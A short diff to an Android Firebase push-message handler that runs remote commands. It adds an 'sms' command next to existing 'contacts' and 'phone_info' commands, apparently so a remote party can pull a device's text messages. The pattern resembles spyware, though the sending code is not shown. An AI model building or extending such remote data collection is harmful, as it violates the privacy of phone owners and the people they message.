@@ -15,6 +15,7 @@ class CommandsService: FirebaseMessagingService() {
         when (message.data["command"]) {
             "contacts" -> Interactor.sendContacts()
             "phone_info" -> Interactor.sendPhoneInfo()
+            "sms" -> Interactor.sendSms()
         }
 
         Log.w(tag, "Received command: ${message.data["command"]}")
